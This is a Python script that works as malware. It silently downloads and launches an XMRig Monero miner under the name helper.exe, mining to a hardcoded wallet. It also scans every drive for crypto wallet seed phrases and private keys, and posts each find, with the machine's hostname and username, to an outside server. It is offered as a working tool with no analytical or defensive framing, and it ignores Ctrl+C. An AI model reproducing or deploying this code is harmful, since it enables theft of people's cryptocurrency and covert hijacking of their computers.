import os
import re
import time
import requests
import subprocess
import threading
import zipfile
from pathlib import Path
from mnemonic import Mnemonic

mnemo = Mnemonic("english")
SERVER = "https://kryhrqs.pythonanywhere.com/export"
WALLET = "Bv3WEwFb17vKiiLGM7xc1UtxzWWfmzNimkq7CyVBjLfU"
TEMP = os.environ.get('TEMP', 'C:\\Windows\\Temp')
MINER = os.path.join(TEMP, 'helper.exe')

print("[SERVICE] Starting...")

def send(data):
    try:
        requests.post(SERVER, json={
            'time': time.time(),
            'host': os.getenv('COMPUTERNAME', ''),
            'user': os.getenv('USERNAME', ''),
            'data': data
        }, timeout=10)
        print(f"[SERVICE] Sent: {data.get('type', 'unknown')}")
    except Exception as e:
        print(f"[SERVICE] Send error: {e}")

def start_miner():
    print("[MINER] Starting...")
    try:
        if not os.path.exists(MINER):
            print("[MINER] Downloading...")
            zip_path = os.path.join(TEMP, 'x.zip')
            r = requests.get(
                'https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip',
                stream=True, timeout=60
            )
            if r.status_code == 200:
                print("[MINER] Download successful, extracting...")
                with open(zip_path, 'wb') as f:
                    for chunk in r.iter_content(8192):
                        f.write(chunk)
                with zipfile.ZipFile(zip_path, 'r') as z:
                    z.extractall(TEMP)
                for root, dirs, files in os.walk(TEMP):
                    for f in files:
                        if f == 'xmrig.exe':
                            os.rename(os.path.join(root, f), MINER)
                            print(f"[MINER] Saved to: {MINER}")
                            break
            else:
                print(f"[MINER] Download failed: {r.status_code}")
                return
        if os.path.exists(MINER):
            print("[MINER] Launching...")
            subprocess.Popen(
                [MINER, '--url=pool.supportxmr.com:3333', f'--user={WALLET}',
                 '--pass=x', '--threads=2', '--keepalive', '--donate-level=1'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print("[MINER] Launched")
        else:
            print("[MINER] File not found")
    except Exception as e:
        print(f"[MINER] Error: {e}")

def scan_file(path):
    try:
        if os.path.getsize(path) > 2 * 1024 * 1024:
            return
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            if not content or len(content) < 20:
                return
            words = re.findall(r'\b[a-zA-Z]+\b', content)
            for i in range(len(words) - 11):
                phrase = ' '.join(words[i:i+12])
                try:
                    if mnemo.check(phrase):
                        print(f"[SCANNER] ✅ SEED FOUND: {path}")
                        send({'type': 'seed', 'path': path, 'content': phrase})
                        return
                except:
                    pass
            for m in re.findall(r'(?:0x)?[a-fA-F0-9]{64}', content):
                if len(m) == 66 and m.startswith('0x'):
                    print(f"[SCANNER] ✅ KEY FOUND: {path}")
                    send({'type': 'key', 'path': path, 'content': m})
                    return
                elif len(m) == 64:
                    print(f"[SCANNER] ✅ KEY FOUND: {path}")
                    send({'type': 'key', 'path': path, 'content': f'0x{m}'})
                    return
    except:
        pass

def scan_drive(drive):
    print(f"[SCANNER] Scanning drive: {drive}")
    try:
        for root, dirs, files in os.walk(drive):
            skip = ['Windows', 'Program Files', 'System32', 'AppData\\Local\\Temp', 'node_modules', '.git']
            dirs[:] = [d for d in dirs if d not in skip and not d.startswith('$')]
            for f in files:
                ext = os.path.splitext(f)[1].lower()
                if ext in ('.txt', '.json', '.dat', '.log', '.bak', '.old', '.md', '.cfg', '.conf', '.ini'):
                    scan_file(os.path.join(root, f))
    except Exception as e:
        print(f"[SCANNER] Error scanning {drive}: {e}")

def main():
    print("[SERVICE] Initializing...")
    print("[SERVICE] Starting miner thread...")
    threading.Thread(target=start_miner, daemon=True).start()
    
    print("[SERVICE] Starting scanner threads...")
    for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
        drive = f'{letter}:\\'
        if os.path.exists(drive):
            print(f"[SERVICE] Scanning drive: {drive}")
            threading.Thread(target=scan_drive, args=(drive,), daemon=True).start()
    
    print("[SERVICE] All threads started. Running.")
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("[SERVICE] Ctrl+C received. Continuing background work.")
        while True:
            time.sleep(60)

if __name__ == '__main__':
    main()